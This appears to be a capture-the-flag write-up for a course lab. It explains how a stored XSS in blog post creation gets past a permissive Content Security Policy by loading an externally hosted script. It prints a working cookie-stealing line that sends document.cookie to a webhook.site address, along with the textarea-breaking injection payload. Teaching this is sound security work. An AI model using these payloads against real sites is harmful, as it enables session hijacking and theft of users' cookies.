# Challenge `Read my lips: No more scripts!` Writeup

- Vulnerability: 
  - XSS attack
- Where:
  - Blogpost creation content
- Impact:
  - allows to steal remote user's cookie

## Analyzing the server

This challenges consists in grabbing the admins' cookies.
By trying the exploits found in previous challenges this error pops up: `Either the 'unsafe-inline' keyword, a hash, or a nonce is required to enable inline execution`. 
This means that a CSP policy is set to prevent any inline scripts but it also says that `Content Security Policy directive: "script-src *"` which indicates that its possible to load scripts from any source.

## Exploit

Since we are able to load scripts, we can create a JavaScript file and host it somewhere so that it can later be loaded 
to perform the attack.
However, it couldn't really be hosted anywhere.
The first try was to copy the last challenge payload to a pastebin link  (https://pastebin.com/)
but this resulted in a `Cross-Origin Read Blocking (CORB)` warning meaning that the script had to be hosted in the same origin as the server running the website.
Since this origin is probably Técnico  it's possible to host the file in the Técnico personal page (https://web.tecnico.ulisboa.pt).
To create the file just SSH to sigma and create a `exploit.js` file in the `/web` directory.
This file contains the same script as before `location='https://webhook.site/your-unique-id/'+document.cookie;`.
The payload is then:
`</textarea><script src=https://web.tecnico.ulisboa.pt/ist195562/exploit.js></script>` which reveals the flag `SSof{R3m0t3_Scripts_are_allowed_with_this_CSP}`.


## Implementation

No script needed.